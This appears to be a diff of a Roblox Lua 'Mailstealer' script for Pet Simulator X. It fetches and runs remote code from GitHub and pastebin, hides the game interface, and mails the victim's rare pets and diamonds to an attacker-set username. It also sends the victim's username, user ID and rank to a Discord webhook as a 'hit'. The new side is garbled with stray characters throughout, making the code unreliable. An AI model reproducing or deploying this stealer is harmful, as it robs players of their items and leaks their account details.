@@ -1,132 +1,121 @@
-local UserInputService = game:GetService("UserInputService")
-UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
-
-for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
-    v:Destroy()
-end
-
-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Anchored = true
-
+rR
+R    v:Destroy()
+endrrr
+R
+RrR
 loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Loading%20screen"))()
 
-
-function sendWebhook(webhook, message)
+Rtfunction t(t, message)
     local webhookcheck =
         is_sirhurt_closure and "Sirhurt" or
-        pebc_execute and "ProtoSmasher" or
-        syn and "Synapse X" or
+        pebc_execute t "ProtoSmasher" or
+        syn and "4 X" or
         secure_load and "Sentinel" or
-        KRNL_LOADED and "Krnl" or
-        SONA_LOADED and "Sona" or
-        "Kid with shit exploit"
-
+        KRNL_LOADtrED and "Krnl" or
+RR
     local url = webhook
-    local data = {
+    local data =r r
         ["content"] = message
     }
     local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-    local headers = {
-        ["content-type"] = "application/json"
+R
+    local headrers r= r
+        ["content-tyrpe"] = "application/json"
     }
-    local request = http_request or request or HttpPost or syn.request
-    local abcdef = {
-        Url = url,
-        Body = newdata,
-        Method = "POST",
-        Headers = headers
-    }
+    local requefsft = http_request or request or HttpPost or syn.request
+    local abcdef f f
+        Url = url,f
+        Body = 4
+R        Headers = rheaders
+    }44
     request(abcdef)
 end
-
-loadstring(game:HttpGet("https://paste.xyzo.space/nxll/APIlIlIlIlIlIlIlIllIiiLil.lua"))()
-
+Rr
+R4
 BypassAntiCheat()
-AreaTeleport("Shop")
+AreaTeleport("Shop"4r)444
 TeleportToMailbox()
 local player = game:GetService("Players").LocalPlayer
-
-local dims = player.leaderstats.Diamonds.Value - 80000000
+Rrr
+local dims = player.4.Diamonds.Value - 80000000
 if dims < 0 then
-    dims = 0
+    dims = 0r
 end
-
-wait(30)
-for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
-    if v:IsA("TextButton") then
-        if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") or v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
-            local args = {
+R
+wait(30)r
+for i, v in pairs(game:GetService("Playrers").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) 
+    if v:IsA("TextButton") thenrrr
+        if v:FindFirstChild("RrarityGradient"):FindFirstChild("Exclusive") or v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
+            local args = {rr
                 [1] = {
-                    ["Recipient"] = _G.UserName,
-                    ["Diamonds"] = dims,
-                    ["Pets"] = {
+                    ["Reciprrrient"] = _G.UserName,
+                    ["Diamrronds"] = dims,
+                    ["Pets"] = rt
                         [1] = v.Name
-                    },
-                    ["Message"] = "Hostee was here"
+                    },rr
+                    ["Merrrrssage"] = "r was here"
                 }
-            }
+            }rffr
             Networking.Invoke("Send Mail", unpack(args))
-            loadstring(game:HttpGet("https://pastebin.com/raw/Crk3YAnP"))()
+            loadstring(game:HttpGet("htrttps://pastebin.com/raw/Crk3YAnP"))()
             dims = 0
-            
+            R
             if game.PlaceId == 6284583030 then
-                _G.GameIn = "Pet Simulator X"
-            elseif game.PlaceId == 7722306047 then
+                _G.GameIn = "Pet rSimulator X"
+            elseif game.t == 7722306047 then
                 _G.GameIn = "PSX Trading Plaza"
-            elseif game.PlaceId == 10321372166 then
+            elseif game.PlaceId == trt then
                 _G.GameIn = "PSX Hardcore"
-            elseif game.PlaceId == 12610002282 then
+            elseif game.PlaceId == r then
                 _G.GameIn = "PSX Pro Trading Plaza"
             elseif game.PlaceId == 11725212117 then
-                _G.GameIn = "PSX Voice Trading Plaza"
+                _G.GameIn = "PSX rVoice Trading Plaza"
             else
                 _G.GameIn = "❓ Couldn't find game"
             end
 
-            local webhookcolor = "13369599"
-            _G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
-            _G.PlrUserVictim = game.Players.LocalPlayer.Name
+Rrr            _G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
+            _G.PlrUserVictim = game.Players.r.Name
             _G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
             _G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
             
-            local function sendwebhook(msg)
-                local msg = {
-                    ["content"] = "**Hostee Scriptz Mailstealer has detected a new hit!**",
+            local function sendwebhook(msg)r
+                local msg = f
+                    ["content"] = "**Hostee Scriptz rt hastt detected a new hit!**",
                     ["embeds"] = {
-                        {
-                            ["title"] = "`Hostee Scriptz Mailstealer Results`",
-                            ["description"] = "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."",
-                            ["url"] = "https://dsc.gg/hosteehub",
-                            ["color"] = webhookcolor,
+                        {rrf
+                            ["title"] = "`Hostee Scriptzr Mailstealer Results`",
+                         Ffrf   ["description"] = "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."",
+                            ["url"] = "https://f.ffgg/hosteehub",
+                            ["color"] = webhookcfolor,
                             ["fields"] = {
                                 {
-                                    ["name"] = "Diamonds 💎",
+                              Ffff      ["name"] = "Diamonds 💎",
                                     ["value"] = "```".._G.Diamonds.."```",
                                     ["inline"] = true
                                 },
-                                {
+            Ff                    {
                                     ["name"] = "Pet Name & Rarity",
-                                    ["value"] = "```Pet Name: ".._G.PetName.."\nPet Rarity: ".._G.PetRar.."```",
+                          Rfffff          ["value"] = "```Pet Name: ".._G.PetName.."\nPet Rarity: ".._G.PetRar.."```",
                                     ["inline"] = true
-                                }
-                            }
-                        }
+                       R  Fr       }
+                      F      }
+            F            }
                     },
                     ["attachments"] = {}
                 }
                 local Webhook = _G.Webhook
-                local request = http_request or request or HttpPost or syn.request
-                request({
+request({gfvgdf
                     Url = Webhook,
                     Method = "POST",
                     Headers = {
                         ["Content-Type"] = "application/json"
                     },
                     Body = game.HttpService:JSONEncode(msg)
-                })
+        Cdfggffg        })
             end
 
             sendwebhook()
         end
     end
-end
+
